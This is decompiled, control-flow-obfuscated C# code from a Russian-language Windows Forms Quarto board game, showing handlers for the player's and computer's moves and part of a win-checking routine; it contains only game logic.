	private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_00c0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d6: Expected O, but got Unknown
		int num5 = default(int);
		int num6 = default(int);
		bool flag3 = default(bool);
		int num9 = default(int);
		int num8 = default(int);
		Graphics graphics_ = default(Graphics);
		bool flag2 = default(bool);
		bool flag = default(bool);
		while (true)
		{
			int num = -624008441;
			while (true)
			{
				uint num2;
				int num7;
				switch ((num2 = (uint)num ^ 0xD3BDF124u) % 25u)
				{
				case 24u:
					num7 = ((board[num5, num6] == null) ? 1 : 0);
					goto IL_0016;
				case 23u:
				{
					int num13;
					int num14;
					if (!flag3)
					{
						num13 = 1357117787;
						num14 = 1357117787;
					}
					else
					{
						num13 = 1164928392;
						num14 = 1164928392;
					}
					num = num13 ^ (int)(num2 * 1805481910);
					continue;
				}
				case 22u:
					num = ((int)num2 * -392187005) ^ -263086221;
					continue;
				case 21u:
					Paint_Board();
					num = ((int)num2 * -1487108144) ^ 0x87B218B;
					continue;
				case 20u:
					num6 = Form1.smethod_38(e) / size;
					num5 = Form1.smethod_39(e) / size;
					num = ((int)num2 * -332069624) ^ -247498773;
					continue;
				case 19u:
					num9++;
					num = -67463960;
					continue;
				case 18u:
					if (Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox1), Form1.smethod_38(e), Form1.smethod_39(e)) != Color.FromArgb(0, 0, 0, 0))
					{
						num = (int)((num2 * 270374999) ^ 0x47D23CBC);
						continue;
					}
					num7 = 0;
					goto IL_0016;
				case 17u:
				{
					int num12;
					if (Form1.smethod_41((Control)(object)borderBox[num8, num9]) == Color.Blue)
					{
						num = -663109931;
						num12 = -663109931;
					}
					else
					{
						num = -10853674;
						num12 = -10853674;
					}
					continue;
				}
				case 16u:
					num8++;
					num = (int)((num2 * 91768168) ^ 0x7AFDC0BF);
					continue;
				case 14u:
					Form1.smethod_45(graphics_);
					num = ((int)num2 * -920936622) ^ -1823525842;
					continue;
				case 13u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.Red, 3f), ((float)num6 + 0.05f) * (float)size, ((float)num5 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = (int)((num2 * 209059623) ^ 0x31E65809);
					continue;
				case 11u:
					num9 = 0;
					num = -67463960;
					continue;
				case 10u:
				{
					int num10;
					int num11;
					if (flag2)
					{
						num10 = -1748678219;
						num11 = -1748678219;
					}
					else
					{
						num10 = -721987458;
						num11 = -721987458;
					}
					num = num10 ^ ((int)num2 * -1557484799);
					continue;
				}
				case 9u:
					Form1.smethod_30((Control)(object)pictureBox1);
					Form1.smethod_7((Control)(object)button2, bool_0: true);
					num = ((int)num2 * -40387177) ^ 0x74FCFF5A;
					continue;
				case 8u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num8, num9]), num6 * size + 4, num5 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num = ((int)num2 * -367351452) ^ -568866845;
					continue;
				case 7u:
					flag = num8 < 4;
					num = -489072451;
					continue;
				case 6u:
					flag3 = num9 < 4;
					num = -657469192;
					continue;
				case 5u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num = (int)(num2 * 1027184188) ^ -343340734;
					continue;
				case 4u:
					num = ((int)num2 * -735345684) ^ 0x3A534E9;
					continue;
				case 3u:
					num = (int)(num2 * 1024121333) ^ -272653922;
					continue;
				case 2u:
					num8 = 0;
					num = (int)((num2 * 1405372667) ^ 0x6D115A71);
					continue;
				case 1u:
				{
					int num3;
					int num4;
					if (!flag)
					{
						num3 = -1169054307;
						num4 = -1169054307;
					}
					else
					{
						num3 = -1070562179;
						num4 = -1070562179;
					}
					num = num3 ^ ((int)num2 * -785040112);
					continue;
				}
				case 0u:
					Form1.smethod_32((Control)(object)richTextBox1, "Уверены? Для выполнения данного хода нажмите \"Подтвердить\".");
					num = (int)((num2 * 564933332) ^ 0x8C823AF);
					continue;
				default:
					return;
				case 12u:
					break;
				case 15u:
					return;
					IL_0016:
					flag2 = (byte)num7 != 0;
					num = -514141353;
					continue;
				}
				break;
			}
		}
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		//IL_03ca: Unknown result type (might be due to invalid IL or missing references)
		//IL_03f8: Expected O, but got Unknown
		Form1.smethod_7((Control)(object)button2, bool_0: false);
		int num19 = default(int);
		int num15 = default(int);
		int num23 = default(int);
		int num24 = default(int);
		int num40 = default(int);
		bool flag10 = default(bool);
		int num5 = default(int);
		int num18 = default(int);
		int num12 = default(int);
		int num13 = default(int);
		int num20 = default(int);
		int num22 = default(int);
		int num46 = default(int);
		Figurine[,] array3 = default(Figurine[,]);
		Figurine[,] array = default(Figurine[,]);
		int num17 = default(int);
		bool flag9 = default(bool);
		int num10 = default(int);
		int num9 = default(int);
		bool flag14 = default(bool);
		bool flag4 = default(bool);
		int num14 = default(int);
		bool flag3 = default(bool);
		int num34 = default(int);
		int num3 = default(int);
		int num16 = default(int);
		bool flag5 = default(bool);
		bool flag = default(bool);
		bool flag6 = default(bool);
		int num4 = default(int);
		int num8 = default(int);
		bool flag7 = default(bool);
		Graphics graphics_ = default(Graphics);
		bool flag11 = default(bool);
		bool flag12 = default(bool);
		Figurine[,] array2 = default(Figurine[,]);
		bool flag13 = default(bool);
		bool flag8 = default(bool);
		bool flag2 = default(bool);
		while (true)
		{
			int num = -1286993397;
			while (true)
			{
				uint num2;
				int num21;
				int num45;
				int num27;
				int num49;
				switch ((num2 = (uint)num ^ 0xDAF479CDu) % 179u)
				{
				case 178u:
					num19++;
					num = (int)(num2 * 1515150842) ^ -2095041036;
					continue;
				case 177u:
					board[num15, num23] = new Figurine(storage[num24, num40]);
					num = ((int)num2 * -1198232059) ^ 0x48BA0AB6;
					continue;
				case 176u:
					num = (int)(num2 * 1645959923) ^ -392422769;
					continue;
				case 175u:
				{
					int num41;
					int num42;
					if (!flag10)
					{
						num41 = -376405962;
						num42 = -376405962;
					}
					else
					{
						num41 = -548537714;
						num42 = -548537714;
					}
					num = num41 ^ (int)(num2 * 325137680);
					continue;
				}
				case 174u:
					Form1.smethod_20(pictureBox[num5, num18], (Image)null);
					num = ((int)num2 * -1951572921) ^ -379784291;
					continue;
				case 173u:
					num = -1347393995;
					continue;
				case 172u:
					num = -1576881165;
					continue;
				case 171u:
					num = ((int)num2 * -1889659376) ^ -4259416;
					continue;
				case 170u:
					Form1.smethod_30((Control)(object)borderBox[num12, num13]);
					num = ((int)num2 * -2003397994) ^ -1384164227;
					continue;
				case 169u:
					num5 = 0;
					num = ((int)num2 * -1880631826) ^ 0x3785C128;
					continue;
				case 168u:
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = (int)((num2 * 969032356) ^ 0x2294786A);
					continue;
				case 167u:
					num13 = 0;
					num = -1194047071;
					continue;
				case 166u:
					num = -1724728773;
					continue;
				case 165u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: true);
					num = (int)((num2 * 2064242236) ^ 0x2BA0BF31);
					continue;
				case 164u:
					num = ((int)num2 * -1487247209) ^ 0x7DEBA5DE;
					continue;
				case 163u:
					Form1.smethod_32((Control)(object)richTextBox1, "QUARTO! Компьютер выиграл!");
					num = -357299660;
					continue;
				case 162u:
					num15 = 0;
					num = ((int)num2 * -1215045758) ^ -79641802;
					continue;
				case 161u:
					flag10 = board[num19, num20] == null;
					num = -484850895;
					continue;
				case 160u:
					num19 = 0;
					num = (int)((num2 * 112566024) ^ 0xEA912CD);
					continue;
				case 159u:
					Form1.smethod_32((Control)(object)richTextBox1, "Выберете фигуру, которой будет играть противник.");
					num = (int)((num2 * 1464587091) ^ 0x6384BE34);
					continue;
				case 158u:
					Paint_Board();
					num = (int)((num2 * 610231564) ^ 0x22A429B0);
					continue;
				case 157u:
					Form1.smethod_15(timer1);
					num = (int)(num2 * 1552236) ^ -348037590;
					continue;
				case 156u:
					board[num19, num20] = new Figurine(storage[num5, num18]);
					num = (int)(num2 * 1326570242) ^ -427726936;
					continue;
				case 155u:
					num = ((int)num2 * -1213474937) ^ -308824597;
					continue;
				case 154u:
					num = ((int)num2 * -461890453) ^ -1682262180;
					continue;
				case 153u:
					num = (int)((num2 * 1757848582) ^ 0x2C9AAE8A);
					continue;
				case 152u:
					num40 = num22;
					num = (int)((num2 * 2102381640) ^ 0x4396D3D0);
					continue;
				case 151u:
					num46++;
					num = ((int)num2 * -952742543) ^ -819179269;
					continue;
				case 150u:
					array3 = (Figurine[,])Form1.smethod_48((Array)array);
					num = ((int)num2 * -2087376755) ^ 0x49135930;
					continue;
				case 149u:
					num17 = Form1.smethod_33(rnd, 4);
					num = (int)(num2 * 1671318302) ^ -469688672;
					continue;
				case 148u:
				{
					int num52;
					int num53;
					if (!flag9)
					{
						num52 = -191510791;
						num53 = -191510791;
					}
					else
					{
						num52 = -1241763626;
						num53 = -1241763626;
					}
					num = num52 ^ (int)(num2 * 529380458);
					continue;
				}
				case 147u:
					Form1.smethod_7((Control)(object)pictureBox[num10, num9], bool_0: true);
					num = -1894466031;
					continue;
				case 146u:
					Form1.smethod_15(timer1);
					num = -686547792;
					continue;
				case 145u:
					flag14 = num22 < 4;
					num = -581076987;
					continue;
				case 144u:
					num = (int)(num2 * 783754061) ^ -1689929195;
					continue;
				case 143u:
					flag4 = Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox1), num22 * size + size / 2, (int)(((float)num14 + 0.05f) * (float)size)) == Color.FromArgb(255, 255, 0, 0);
					num = -973358393;
					continue;
				case 142u:
					array = (Figurine[,])Form1.smethod_48((Array)board);
					num = (int)(num2 * 1616303933) ^ -1533055532;
					continue;
				case 141u:
					num22++;
					num = ((int)num2 * -986913094) ^ -1018138772;
					continue;
				case 139u:
					num = (int)(num2 * 1608755849) ^ -1773325393;
					continue;
				case 138u:
					flag3 = Standoff(board);
					num = (int)((num2 * 603365559) ^ 0x8232466);
					continue;
				case 137u:
					num34++;
					num = ((int)num2 * -1605460173) ^ 0x7955E861;
					continue;
				case 136u:
					storage[num24, num40] = null;
					num = ((int)num2 * -11220203) ^ -1294212950;
					continue;
				case 135u:
					Form1.smethod_30((Control)(object)borderBox[num5, num18]);
					num = (int)((num2 * 2023706827) ^ 0x512E9E3C);
					continue;
				case 134u:
				{
					int num37;
					if (num3 < 4)
					{
						num = -1060844826;
						num37 = -1060844826;
					}
					else
					{
						num = -1321572716;
						num37 = -1321572716;
					}
					continue;
				}
				case 133u:
					num10 = 0;
					num = ((int)num2 * -1100365308) ^ -702501753;
					continue;
				case 132u:
					board[num16, num17] = new Figurine(storage[num5, num18]);
					num = (int)((num2 * 1721458027) ^ 0x1CAFE45);
					continue;
				case 131u:
					num14++;
					num = ((int)num2 * -991153156) ^ 0x51C6521F;
					continue;
				case 130u:
					storage[num5, num18] = null;
					num = (int)((num2 * 521364942) ^ 0x7600DFBE);
					continue;
				case 129u:
				{
					int num30;
					int num31;
					if (flag5)
					{
						num30 = -1572294339;
						num31 = -1572294339;
					}
					else
					{
						num30 = -1304281231;
						num31 = -1304281231;
					}
					num = num30 ^ ((int)num2 * -290398303);
					continue;
				}
				case 128u:
					num22 = 0;
					num = -848084270;
					continue;
				case 127u:
					num9 = 0;
					num = -1515981748;
					continue;
				case 126u:
					(menu as Form3).ContinueLock();
					num = (int)((num2 * 325885037) ^ 0x4245415B);
					continue;
				case 125u:
					num = ((int)num2 * -416566277) ^ 0x46C7C37F;
					continue;
				case 124u:
					flag = num12 < 4;
					num = -170683392;
					continue;
				case 123u:
					num = (int)(num2 * 683034886) ^ -1864246712;
					continue;
				case 122u:
				{
					int num6;
					int num7;
					if (!flag)
					{
						num6 = -1091801026;
						num7 = -1091801026;
					}
					else
					{
						num6 = -352196630;
						num7 = -352196630;
					}
					num = num6 ^ (int)(num2 * 1738642198);
					continue;
				}
				case 121u:
				{
					int num66;
					int num67;
					if (flag6)
					{
						num66 = 1190744108;
						num67 = 1190744108;
					}
					else
					{
						num66 = 743595071;
						num67 = 743595071;
					}
					num = num66 ^ (int)(num2 * 2105747202);
					continue;
				}
				case 120u:
					num = -823541893;
					continue;
				case 119u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ничья!");
					num = (int)((num2 * 1072557859) ^ 0x13609D4F);
					continue;
				case 118u:
				{
					int num64;
					int num65;
					if (!(Form1.smethod_41((Control)(object)borderBox[num14, num22]) == Color.Blue))
					{
						num64 = 458698338;
						num65 = 458698338;
					}
					else
					{
						num64 = 1778474489;
						num65 = 1778474489;
					}
					num = num64 ^ (int)(num2 * 1697111500);
					continue;
				}
				case 117u:
					num = ((int)num2 * -1117457841) ^ 0x5E7404A7;
					continue;
				case 116u:
					num = (int)((num2 * 2081138769) ^ 0x69210AB3);
					continue;
				case 115u:
				{
					array3[num34, num3] = new Figurine(storage[num4, num8]);
					int num62;
					int num63;
					if (Stop(array3))
					{
						num62 = 636514705;
						num63 = 636514705;
					}
					else
					{
						num62 = 805123241;
						num63 = 805123241;
					}
					num = num62 ^ ((int)num2 * -1065785983);
					continue;
				}
				case 114u:
					num = (int)((num2 * 808237937) ^ 0x61DAA0A8);
					continue;
				case 113u:
					Form1.smethod_30((Control)(object)borderBox[num5, num18]);
					num = ((int)num2 * -1975824199) ^ -388946417;
					continue;
				case 112u:
				{
					int num61;
					if (num13 >= 4)
					{
						num = -2101470654;
						num61 = -2101470654;
					}
					else
					{
						num = -1298575611;
						num61 = -1298575611;
					}
					continue;
				}
				case 111u:
					num = ((int)num2 * -806381353) ^ -1454330212;
					continue;
				case 110u:
				{
					int num59;
					int num60;
					if (!Form1.smethod_46((Control)(object)pictureBox1))
					{
						num59 = -692931292;
						num60 = -692931292;
					}
					else
					{
						num59 = -262362542;
						num60 = -262362542;
					}
					num = num59 ^ (int)(num2 * 438136422);
					continue;
				}
				case 109u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = (int)((num2 * 1340091563) ^ 0x6B681C2D);
					continue;
				case 108u:
					num = (int)(num2 * 894247320) ^ -577645856;
					continue;
				case 107u:
					Form1.smethod_32((Control)(object)richTextBox1, "Подождите, компьютер делает свой ход.");
					num = (int)((num2 * 1462117767) ^ 0x64AADFC9);
					continue;
				case 106u:
					num = -248933722;
					continue;
				case 105u:
					num20 = 0;
					num = -77045517;
					continue;
				case 104u:
					num = ((int)num2 * -1532218639) ^ 0x9B43D71;
					continue;
				case 103u:
					flag5 = num20 < 4;
					num = -652603404;
					continue;
				case 102u:
				{
					int num57;
					int num58;
					if (flag7)
					{
						num57 = 714371753;
						num58 = 714371753;
					}
					else
					{
						num57 = 1722473769;
						num58 = 1722473769;
					}
					num = num57 ^ (int)(num2 * 814716869);
					continue;
				}
				case 101u:
				{
					int num55;
					int num56;
					if (!flag14)
					{
						num55 = 244423880;
						num56 = 244423880;
					}
					else
					{
						num55 = 583486849;
						num56 = 583486849;
					}
					num = num55 ^ (int)(num2 * 1157432693);
					continue;
				}
				case 100u:
					num = (int)(num2 * 1942722671) ^ -2022304774;
					continue;
				case 99u:
					num = ((int)num2 * -165793052) ^ -1535700227;
					continue;
				case 98u:
				{
					int num54;
					if (num34 < 4)
					{
						num = -848147745;
						num54 = -848147745;
					}
					else
					{
						num = -1486170241;
						num54 = -1486170241;
					}
					continue;
				}
				case 97u:
					num46 = 0;
					num = (int)(num2 * 1416347158) ^ -308880964;
					continue;
				case 96u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.LimeGreen, 3f), ((float)num17 + 0.05f) * (float)size, ((float)num16 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = (int)(num2 * 1527405792) ^ -344986575;
					continue;
				case 95u:
				{
					int num50;
					int num51;
					if (board[num16, num17] == null)
					{
						num50 = 1014059404;
						num51 = 1014059404;
					}
					else
					{
						num50 = 1406860139;
						num51 = 1406860139;
					}
					num = num50 ^ (int)(num2 * 877025960);
					continue;
				}
				case 94u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num5, num18]), num20 * size + 4, num19 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					Form1.smethod_30((Control)(object)pictureBox1);
					Form1.smethod_47(200);
					num = (int)((num2 * 1281153309) ^ 0xAFB9132);
					continue;
				case 93u:
					step++;
					num = ((int)num2 * -2143552101) ^ 0x6F486178;
					continue;
				case 92u:
					flag11 = num14 < 4;
					num = -28471218;
					continue;
				case 91u:
					flag12 = true;
					num = (int)(num2 * 2052041166) ^ -987065028;
					continue;
				case 90u:
					Form1.smethod_47(200);
					Form1.smethod_5((Control)(object)borderBox[num5, num18], Color.White);
					num = (int)(num2 * 1740563382) ^ -251826728;
					continue;
				case 89u:
					num = -2093612959;
					continue;
				case 88u:
					num = ((int)num2 * -81490671) ^ -1767632941;
					continue;
				case 87u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.LimeGreen, 3f), ((float)num20 + 0.05f) * (float)size, ((float)num19 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = ((int)num2 * -896316856) ^ 0x1B7CD1DA;
					continue;
				case 86u:
					num = (int)(num2 * 1775077714) ^ -608482257;
					continue;
				case 85u:
					flag12 = false;
					num = ((int)num2 * -1804054586) ^ 0x7CD75373;
					continue;
				case 84u:
					num9++;
					num = (int)((num2 * 1065340203) ^ 0x146742F2);
					continue;
				case 83u:
					num21 = (Standoff(array2) ? 1 : 0);
					goto IL_0ba4;
				case 82u:
					if (num8 != num18)
					{
						goto IL_0bb8;
					}
					goto IL_0bc4;
				case 81u:
				{
					int num47;
					int num48;
					if (flag13)
					{
						num47 = -918512309;
						num48 = -918512309;
					}
					else
					{
						num47 = -73640859;
						num48 = -73640859;
					}
					num = num47 ^ (int)(num2 * 49924162);
					continue;
				}
				case 80u:
					step++;
					num = (int)(num2 * 899410924) ^ -417615956;
					continue;
				case 79u:
					storage[num5, num18] = null;
					num = ((int)num2 * -1632281975) ^ 0x18387133;
					continue;
				case 78u:
					num45 = ((num46 < 9) ? 1 : 0);
					goto IL_0c47;
				case 77u:
					num = (int)((num2 * 2010054088) ^ 0x21C8F2CE);
					continue;
				case 76u:
					if (!flag12)
					{
						num = ((int)num2 * -114775688) ^ -1823908639;
						continue;
					}
					num45 = 1;
					goto IL_0c47;
				case 75u:
					num = (int)((num2 * 438368938) ^ 0x7373943);
					continue;
				case 74u:
					num = (int)((num2 * 28060991) ^ 0xB2EDA77);
					continue;
				case 73u:
					Form1.smethod_5((Control)(object)borderBox[num5, num18], Color.White);
					num = (int)(num2 * 273216540) ^ -693686966;
					continue;
				case 72u:
					num = ((int)num2 * -1772866065) ^ 0x5912A715;
					continue;
				case 71u:
					num40 = 0;
					num = (int)(num2 * 1247989993) ^ -1273804208;
					continue;
				case 70u:
				{
					int num43;
					int num44;
					if (flag11)
					{
						num43 = 1073735090;
						num44 = 1073735090;
					}
					else
					{
						num43 = 47357187;
						num44 = 47357187;
					}
					num = num43 ^ ((int)num2 * -2063240312);
					continue;
				}
				case 69u:
					num = (int)((num2 * 1703374349) ^ 0x5B41FD8F);
					continue;
				case 68u:
					Form1.smethod_30((Control)(object)label2);
					num = (int)(num2 * 1588471686) ^ -220898947;
					continue;
				case 67u:
				{
					int num38;
					int num39;
					if (!(Form1.smethod_41((Control)(object)borderBox[num12, num13]) == Color.Red))
					{
						num38 = 813348452;
						num39 = 813348452;
					}
					else
					{
						num38 = 1044406665;
						num39 = 1044406665;
					}
					num = num38 ^ (int)(num2 * 432668258);
					continue;
				}
				case 66u:
					num34 = 0;
					num = ((int)num2 * -1100414926) ^ -400275754;
					continue;
				case 65u:
					Form1.smethod_32((Control)(object)richTextBox1, "Противник сделал ход (зелёный). Выберете поле на доске для выбронной противником фигуры (синий).");
					num = ((int)num2 * -1589289320) ^ -596084626;
					continue;
				case 64u:
					num = (int)((num2 * 470362200) ^ 0x7A03508E);
					continue;
				case 63u:
					Form1.smethod_30((Control)(object)borderBox[num4, num8]);
					num = (int)((num2 * 388558537) ^ 0x50893D51);
					continue;
				case 62u:
					Form1.smethod_20(pictureBox[num14, num22], (Image)null);
					Form1.smethod_30((Control)(object)pictureBox[num14, num22]);
					num = ((int)num2 * -2008215844) ^ -319712281;
					continue;
				case 60u:
					Form1.smethod_30((Control)(object)pictureBox[num5, num18]);
					num = ((int)num2 * -857586494) ^ -662852907;
					continue;
				case 59u:
					Form1.smethod_7((Control)(object)pictureBox[num12, num13], bool_0: false);
					num = (int)((num2 * 411054951) ^ 0x4B794D61);
					continue;
				case 58u:
					num = (int)((num2 * 90540859) ^ 0x505A768);
					continue;
				case 57u:
					Form1.smethod_30((Control)(object)richTextBox1);
					num = (int)((num2 * 1625265228) ^ 0x125DFF73);
					continue;
				case 56u:
					num = -1919067146;
					continue;
				case 55u:
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = (int)((num2 * 1587320668) ^ 0x3171E595);
					continue;
				case 54u:
					flag9 = Standoff(board);
					num = -911525232;
					continue;
				case 53u:
					num = (int)((num2 * 417232729) ^ 0x1BE58FE9);
					continue;
				case 52u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num5, num18]), num17 * size + 4, num16 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num = (int)(num2 * 516078879) ^ -326938560;
					continue;
				case 51u:
					num12++;
					num = (int)(num2 * 1869245068) ^ -485605166;
					continue;
				case 50u:
					num = -1140357654;
					continue;
				case 49u:
					num = -1753559673;
					continue;
				case 48u:
					Form1.smethod_5((Control)(object)borderBox[num14, num22], Color.White);
					Form1.smethod_30((Control)(object)borderBox[num14, num22]);
					num = (int)(num2 * 369877642) ^ -607795017;
					continue;
				case 47u:
					num = (int)((num2 * 1093963796) ^ 0x2AF78A73);
					continue;
				case 46u:
					Form1.smethod_20(pictureBox[num5, num18], (Image)null);
					num = (int)(num2 * 565358312) ^ -1383359212;
					continue;
				case 45u:
					if (!Stop(board))
					{
						num = (int)(num2 * 781348586) ^ -1822061863;
						continue;
					}
					goto IL_1054;
				case 44u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num = ((int)num2 * -359523291) ^ -489649165;
					continue;
				case 43u:
					num = (int)(num2 * 943806489) ^ -817797890;
					continue;
				case 42u:
					num10++;
					num = (int)(num2 * 1866117926) ^ -605280453;
					continue;
				case 41u:
					Form1.smethod_30((Control)(object)pictureBox[num5, num18]);
					num = (int)((num2 * 875736245) ^ 0x250A62BC);
					continue;
				case 40u:
					num = (int)((num2 * 285482218) ^ 0x54C25EA0);
					continue;
				case 39u:
					num = ((int)num2 * -320005624) ^ -834532229;
					continue;
				case 38u:
				{
					int num35;
					int num36;
					if (flag8)
					{
						num35 = 1853437372;
						num36 = 1853437372;
					}
					else
					{
						num35 = 257924761;
						num36 = 257924761;
					}
					num = num35 ^ ((int)num2 * -270567976);
					continue;
				}
				case 37u:
					num23 = 0;
					num14 = 0;
					num = ((int)num2 * -930217409) ^ -378158332;
					continue;
				case 36u:
					num20++;
					num = -77045517;
					continue;
				case 35u:
					flag7 = array[num34, num3] == null;
					num = -662703333;
					continue;
				case 34u:
				{
					int num32;
					int num33;
					if (!flag2)
					{
						num32 = 1248916648;
						num33 = 1248916648;
					}
					else
					{
						num32 = 1087676241;
						num33 = 1087676241;
					}
					num = num32 ^ (int)(num2 * 863936430);
					continue;
				}
				case 33u:
					flag6 = num19 < 4;
					num = -407719606;
					continue;
				case 32u:
					num24 = num14;
					num = (int)(num2 * 1281292469) ^ -430522862;
					continue;
				case 31u:
					num3 = 0;
					num = -779374003;
					continue;
				case 30u:
					num = -1312883085;
					continue;
				case 29u:
					num18 = 0;
					num12 = 0;
					num = (int)((num2 * 1516808614) ^ 0x28003D4);
					continue;
				case 28u:
				{
					int num28;
					int num29;
					if (flag4)
					{
						num28 = 1873666864;
						num29 = 1873666864;
					}
					else
					{
						num28 = 1119214766;
						num29 = 1119214766;
					}
					num = num28 ^ (int)(num2 * 1699565791);
					continue;
				}
				case 27u:
					if (!Standoff(board))
					{
						num = -817278975;
						num27 = -817278975;
						continue;
					}
					goto IL_1054;
				case 26u:
					Form1.smethod_5((Control)(object)borderBox[num4, num8], Color.Blue);
					num = (int)((num2 * 1155716873) ^ 0x3039503E);
					continue;
				case 25u:
				{
					int num25;
					int num26;
					if (flag3)
					{
						num25 = 1245692426;
						num26 = 1245692426;
					}
					else
					{
						num25 = 1135131785;
						num26 = 1135131785;
					}
					num = num25 ^ (int)(num2 * 1180859860);
					continue;
				}
				case 24u:
					Form1.smethod_5((Control)(object)borderBox[num12, num13], Color.LimeGreen);
					num = ((int)num2 * -2082362495) ^ -261139120;
					continue;
				case 23u:
					num5 = num12;
					num = (int)((num2 * 637603580) ^ 0x2036F2C);
					continue;
				case 22u:
					num13++;
					num = ((int)num2 * -367162734) ^ -1104652871;
					continue;
				case 21u:
					num16 = Form1.smethod_33(rnd, 4);
					num = (int)((num2 * 461749991) ^ 0x6564DDE9);
					continue;
				case 20u:
					array2 = (Figurine[,])Form1.smethod_48((Array)board);
					num = ((int)num2 * -803947833) ^ -749320152;
					continue;
				case 19u:
					num = -1836748548;
					continue;
				case 18u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: false);
					num24 = 0;
					num = ((int)num2 * -176322067) ^ -107088210;
					continue;
				case 17u:
					num18 = num13;
					num = ((int)num2 * -1405067423) ^ 0x12136C31;
					continue;
				case 16u:
					num23 = num22;
					num = (int)(num2 * 61512960) ^ -1831937026;
					continue;
				case 15u:
					Form1.smethod_47(1000);
					num = ((int)num2 * -772047946) ^ 0x6487F914;
					continue;
				case 14u:
					array2[num19, num20] = new Figurine(storage[num5, num18]);
					if (!Stop(array2))
					{
						num = (int)(num2 * 747229278) ^ -884330397;
						continue;
					}
					num21 = 1;
					goto IL_0ba4;
				case 13u:
					array[num16, num17] = new Figurine(storage[num5, num18]);
					num = (int)(num2 * 198259044) ^ -1909305013;
					continue;
				case 12u:
					(menu as Form3).ContinueLock();
					num = ((int)num2 * -622665257) ^ 0x30C86C98;
					continue;
				case 11u:
					num15 = num14;
					num = (int)((num2 * 925376741) ^ 0x419567A9);
					continue;
				case 10u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ничья!");
					num = ((int)num2 * -1092619636) ^ 0x6E6101F1;
					continue;
				case 9u:
				{
					int num11;
					if (num10 >= 4)
					{
						num = -871774900;
						num11 = -871774900;
					}
					else
					{
						num = -593651989;
						num11 = -593651989;
					}
					continue;
				}
				case 8u:
					num = ((int)num2 * -1892880476) ^ -985820935;
					continue;
				case 7u:
					num = (int)((num2 * 1496976921) ^ 0x99D2AFF);
					continue;
				case 6u:
					flag2 = num9 < 4;
					num = -1853062181;
					continue;
				case 5u:
					num4 = Form1.smethod_33(rnd, 4);
					num8 = Form1.smethod_33(rnd, 4);
					if (storage[num4, num8] != null)
					{
						num = (int)((num2 * 1998512013) ^ 0x4D1AA1DB);
						continue;
					}
					goto IL_0bc4;
				case 4u:
					num = ((int)num2 * -828302740) ^ 0x4F28C3CA;
					continue;
				case 3u:
					if (num4 == num5)
					{
						num = ((int)num2 * -1094713473) ^ -16872379;
						continue;
					}
					goto IL_0bb8;
				case 2u:
					num = -1540873411;
					continue;
				case 1u:
					num = (int)(num2 * 10097629) ^ -229649442;
					continue;
				case 0u:
					num3++;
					num = -779374003;
					continue;
				default:
					return;
				case 61u:
					break;
				case 140u:
					return;
					IL_1054:
					num = -1171395595;
					num27 = -1171395595;
					continue;
					IL_0c47:
					flag8 = (byte)num45 != 0;
					num = -909116862;
					continue;
					IL_0bb8:
					num = -948798812;
					num49 = -948798812;
					continue;
					IL_0bc4:
					num = -659318556;
					num49 = -659318556;
					continue;
					IL_0ba4:
					flag13 = (byte)num21 != 0;
					num = -91502299;
					continue;
				}
				break;
			}
		}
	}

	private bool Stop(Figurine[,] mem)
	{
		bool flag2 = default(bool);
		int num3 = default(int);
		bool flag = default(bool);
		bool result = default(bool);
		while (true)
		{
			int num = -1593668223;
			while (true)
			{
				uint num2;
				int num29;
				int num22;
				switch ((num2 = (uint)num ^ 0xE8BCCBB6u) % 76u)
				{
				case 75u:
					flag2 = false;
					num = ((int)num2 * -377874555) ^ 0x37F06A08;
					continue;
				case 74u:
				{
					int num35;
					int num36;
					if (mem[num3, 0] == null)
					{
						num35 = -416347897;
						num36 = -416347897;
					}
					else
					{
						num35 = -318296886;
						num36 = -318296886;
					}
					num = num35 ^ (int)(num2 * 1696862790);
					continue;
				}
				case 73u:
					if (mem[2, 1].Dark != mem[3, 0].Dark)
					{
						num = ((int)num2 * -1343118938) ^ 0x4D7DE5F8;
						continue;
					}
					goto IL_007c;
				case 72u:
				{
					int num46;
					int num47;
					if (mem[1, 1].Big == mem[2, 2].Big)
					{
						num46 = 485737211;
						num47 = 485737211;
					}
					else
					{
						num46 = 1145339079;
						num47 = 1145339079;
					}
					num = num46 ^ (int)(num2 * 42944731);
					continue;
				}
				case 71u:
				{
					int num12;
					int num13;
					if (!flag)
					{
						num12 = -1882973640;
						num13 = -1882973640;
					}
					else
					{
						num12 = -1516541719;
						num13 = -1516541719;
					}
					num = num12 ^ (int)(num2 * 1053568088);
					continue;
				}
				case 70u:
					if (mem[1, 2] != null)
					{
						num = (int)((num2 * 1662398171) ^ 0x240CC44A);
						continue;
					}
					goto IL_0088;
				case 69u:
					if (mem[2, 2].Big != mem[3, 3].Big)
					{
						num = ((int)num2 * -867240294) ^ 0x5FF2B325;
						continue;
					}
					goto IL_007c;
				case 68u:
				{
					int num8;
					int num9;
					if (mem[2, 2] != null)
					{
						num8 = -1926938987;
						num9 = -1926938987;
					}
					else
					{
						num8 = -1530237307;
						num9 = -1530237307;
					}
